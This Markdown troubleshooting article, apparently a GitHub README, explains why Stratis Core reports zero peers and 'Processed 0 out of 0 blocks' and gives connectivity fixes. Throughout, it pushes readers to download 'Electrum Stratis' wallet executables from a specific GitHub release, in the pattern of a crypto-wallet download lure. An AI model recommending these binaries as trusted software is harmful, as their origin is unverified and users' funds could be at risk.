![Electrum-Stratis](assets/banner-article.png)

# Core with zero peers: "Processed 0 out of 0 blocks"

<p align="center">An empty queue, not an empty chain</p>

<p align="center"><a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe"><img alt="Download for Windows" src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-089ae8?style=for-the-badge&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg"><img alt="Download for macOS" src="https://img.shields.io/badge/DOWNLOAD-MACOS-089ae8?style=for-the-badge&labelColor=071727&logo=apple&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip"><img alt="Download for Linux" src="https://img.shields.io/badge/DOWNLOAD-LINUX-089ae8?style=for-the-badge&labelColor=071727&logo=linux&logoColor=ffffff"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img alt="Windows" height="24" src="https://img.shields.io/badge/os-windows-089ae8?style=flat-square&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"> | Windows 10 (1909) or later, 64-bit | [`electrum-stratis-v2.7.19.exe`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe) |
| <img alt="macOS" height="24" src="https://img.shields.io/badge/os-macos-089ae8?style=flat-square&labelColor=071727&logo=apple&logoColor=ffffff"> | macOS 12 or later | [`electrum-stratis-v2.7.19.dmg`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg) |
| <img alt="Linux" height="24" src="https://img.shields.io/badge/os-linux-089ae8?style=flat-square&labelColor=071727&logo=linux&logoColor=ffffff"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-stratis-v2.7.19.zip`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip) |

</div>

All versions, installers and checksums are on the [Electrum-Stratis v2.7.19 release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19).

> Only download from this GitHub release page.

Zero peers in Stratis Core means the node has no one to download blocks from, so it has no blocks to process - the counters describe an empty queue, not a damaged chain. Core cannot sync without at least one reachable peer, and until one answers, the wallet's view of every address is frozen at whatever it last knew. Fix the connection and the numbers start moving on their own. Electrum Stratis is a self-custody desktop wallet for the legacy Stratis chain, and it sidesteps the problem by querying servers instead of maintaining a full node.

## You'll see this if

<div align="center">

| What the screen says | What it means | First move |
|---|---|---|
| Processed 0 out of 0 blocks | No peers at all | Check the network path |
| Connections: 0 | Nothing answered | Try another network |
| Connections: 1, height frozen | A peer that is not useful | Replace it |
| Blocks climbing slowly | Working, just slow | Wait |
| Height current, balance absent | Different fault | Rescan |

</div>

The phrase to hold onto is "no peers, no blocks". Everything else on that screen is downstream of it.

## Why it happens

A full node discovers peers by asking known addresses for their own peer lists, then connects outward. If the first steps fail - the network blocks the port, a firewall drops outbound connections, a VPN rewrites traffic, or the seed list is stale - the node has nobody to ask and nothing to download. It reports zero of zero because that is literally its workload.

The failure is usually local even when it feels remote. A machine that can browse the web can still fail to reach a peer-to-peer port, because browsing uses outbound HTTP and the node needs a different outbound connection that a firewall or an antivirus may treat differently. A network that inspects TLS can also break the handshake without blocking the connection outright, which produces "0 connections" with no error the user can see. Current builds ship a current peer list and current protocol handling, and running the [release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19) is often the whole difference between zero connections and a working node ([synced to a stale peer](https://github.com/electrum-stratis-project/electrum-stratis-fixes/blob/main/synced-to-a-stale-peer.md); [the Electrum Stratis server list](https://github.com/electrum-stratis-project/electrum-stratis-fixes/blob/main/the-server-list-explained.md)).

There is also an age dimension. The peer list a build ships with can go stale, and a node that only knows retired addresses will sit at zero forever. That is one of the reasons updating is the first answer for a stuck node rather than a last resort.

## Fix

1. **Confirm the machine has working internet.** Open a page in a browser. If that fails, the node is not the problem.
2. **Check outbound access.** A firewall, a corporate proxy or a VPN can block peer connections while leaving web traffic untouched. Test with the VPN off, and allow the application through the firewall.
3. **Let it find peers again.** Restart the node and give it a few minutes; discovery is not instant, and a first connection often appears well after launch.
4. **Point it at a known peer.** If the shipped list is stale, adding a reachable peer by address gives the node a starting point and lets it discover the rest.
5. **Update to the current release if the build is old.** Current builds ship a current peer list and current protocol handling; an old binary can fail to connect for reasons no setting fixes.
6. **Compare the height with an explorer.** Once a peer answers, the height should climb toward the chain tip. If it does not, the problem has changed from connectivity to trust in the peer.

If the node connects and begins downloading, stop troubleshooting. The counters below the message will explain themselves.

## If that did not work

If connections stay at zero on every network, the block is local and specific: capture the debug log, which records each attempted connection and why it failed. That log is the difference between a guess and a report.

If one peer connects and the height stays at zero, the peer is answering but not serving blocks. Replace it rather than waiting; a peer that will not serve is indistinguishable from no peer except in the connection count.

If the wallet opens but the balance is missing after a sync, the node is no longer the suspect. The next check is the address itself, and the balance diagnosis that follows is a different procedure ([three causes of a missing Electrum Stratis balance](https://github.com/electrum-stratis-project/electrum-stratis-fixes/blob/main/balance-is-missing.md)). That is a rescan question or an address question, and both have their own checks.

If the disk is full, the node can connect and still fail to store blocks, which looks like a sync that never progresses. Check free space before blaming the network.

## Prevention

- Keep the node updated; peer lists and protocol handling move with releases.
- Allow the application through the firewall once, rather than disabling the firewall.
- Avoid running the node behind a TLS-inspecting proxy.
- Keep free disk space for the chain.
- Check the connection count before drawing conclusions about a balance.
- Run the actively maintained build, which ships the current peer list and protocol handling.

## FAQ

### What does "Processed 0 out of 0 blocks" mean?

It means the node has no peers, so there are no blocks queued to process. The counters are not an error message about the chain; they are a statement that nothing has arrived.

### Why does Core show zero connections?

Either nothing is reachable on the peer port, or the peer list the build knows is stale. Test the network path first, then update the build, then add a known peer by address.

### Can I use Electrum Stratis instead of waiting for a sync?

Yes. It asks servers for headers and for the history of your own addresses, so it reaches a usable state in minutes. The trade-off is that it trusts those servers for chain data rather than validating everything locally.

### Is my balance lost while the node has no peers?

No. Coins are on chain at your addresses; a node with no peers simply cannot see them. The keys are in the wallet file, and nothing about a connection failure changes that.

<!-- DOWNLOAD-BLOCK -->

## Related articles

- [Coins sent to Core, and what the balance is waiting for](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/coins-sent-to-core-wallet.md)
- [Synced but far behind: the stale peer](https://github.com/electrum-stratis-project/electrum-stratis-fixes/blob/main/synced-to-a-stale-peer.md)
- [Why "Not Connected" happens](https://github.com/electrum-stratis-project/electrum-stratis-fixes/blob/main/wallet-says-not-connected.md)
- [The server list and the cloud node](https://github.com/electrum-stratis-project/electrum-stratis-fixes/blob/main/the-server-list-explained.md)
